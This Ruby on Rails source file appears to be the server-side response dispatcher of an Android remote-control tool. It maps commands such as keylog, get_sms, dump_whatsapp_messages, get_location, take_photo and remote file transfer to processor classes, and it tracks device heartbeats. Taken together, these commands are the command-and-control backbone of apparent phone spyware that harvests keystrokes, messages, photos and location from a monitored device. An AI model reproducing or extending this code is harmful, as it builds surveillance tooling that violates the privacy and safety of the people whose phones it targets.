# frozen_string_literal: true

# Processes responses from Android devices and dispatches to specific processor classes
# based on the PendingCommand's command type
class ResponseProcessor
  # Command type to processor class mapping
  COMMAND_PROCESSORS = {
    'get_contacts' => ContactsResponseProcessor,
    'get_call_logs' => CalllogsResponseProcessor,
    'get_location' => LocationResponseProcessor,
    'get_device_info' => DeviceinfoResponseProcessor,
    'get_sms' => SmsResponseProcessor,
    'take_screenshot' => ScreenshotResponseProcessor,
    'take_photo' => PhotoResponseProcessor,
    'get_installed_apps' => AppsResponseProcessor,
    'dump_whatsapp_messages' => WhatsAppResponseProcessor,
    'keylog' => KeylogResponseProcessor,
    'list_installed_apps' => InstalledAppsResponseProcessor,
    'list_files' => FileBrowserResponseProcessor,
    'download_file' => FileBrowserResponseProcessor,
    'upload_file' => FileBrowserResponseProcessor,
    'upload_file_chunk' => FileBrowserResponseProcessor,
    'delete_file' => FileBrowserResponseProcessor,
    'preview_file' => FileBrowserResponseProcessor,
    'rename_file' => FileBrowserResponseProcessor,
    'move_file' => FileBrowserResponseProcessor,
    'search_files' => FileBrowserResponseProcessor
  }.freeze

  def self.process(data)
    return unless data.is_a?(Hash)
    
    payload = data['payload'] || data['data'] || data
    
    # Handle heartbeat without requiring PendingCommand
    if payload['type'] == 'heartbeat' || payload['command'] == 'heartbeat'
      process_heartbeat(payload)
      return
    end
    
    request_id = payload['request_id'] || payload['command_id']
    
    return Rails.logger.warn("[ResponseProcessor] No request_id/command_id found in payload") unless request_id
    
    # Look up PendingCommand using request_id
    pending_command = PendingCommand.find_by(request_id: request_id)
    return Rails.logger.warn("[ResponseProcessor] PendingCommand not found for request_id: #{request_id}") unless pending_command
    
    Rails.logger.info "[ResponseProcessor] Processing command '#{pending_command.command}' for request_id: #{request_id}"
    
    # Get the appropriate processor class based on command type
    processor_class = COMMAND_PROCESSORS[pending_command.command]
    
    unless processor_class
      error_msg = "Unknown command type: #{pending_command.command}"
      Rails.logger.error "[ResponseProcessor] #{error_msg}"
      pending_command.mark_failed(error_msg)
      return
    end
    
    # Instantiate and process
    processor = processor_class.new(pending_command, payload)
    processor.process
    
    Rails.logger.info "[ResponseProcessor] Successfully processed '#{pending_command.command}' for request_id: #{request_id}"
  rescue StandardError => e
    Rails.logger.error "[ResponseProcessor] Error processing request_id #{request_id}: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
    
    # Attempt to mark the pending command as failed if we have one
    pending_command&.mark_failed(e.message) if pending_command
  end

  private

  def self.process_heartbeat(payload)
    device_id = payload['device_id']
    
    return Rails.logger.warn("[ResponseProcessor] No device_id in heartbeat payload") unless device_id.present?
    
    # Find the smartphone
    smartphone = Smartphone.find_by(device_id: device_id)
    unless smartphone
      Rails.logger.warn("[ResponseProcessor] Smartphone not found for device_id: #{device_id}")
      return
    end
    
    # Update heartbeat in Redis
    metadata = {
      battery_level: payload['battery_level'],
      connectivity: payload['connectivity'],
      timestamp: Time.current.to_i
    }
    
    HeartbeatMonitor.process_heartbeat(device_id, metadata)
    
    Rails.logger.info "[ResponseProcessor] Processed heartbeat for device #{device_id} (#{smartphone.name})"
  rescue StandardError => e
    Rails.logger.error "[ResponseProcessor] Error processing heartbeat: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
  end
end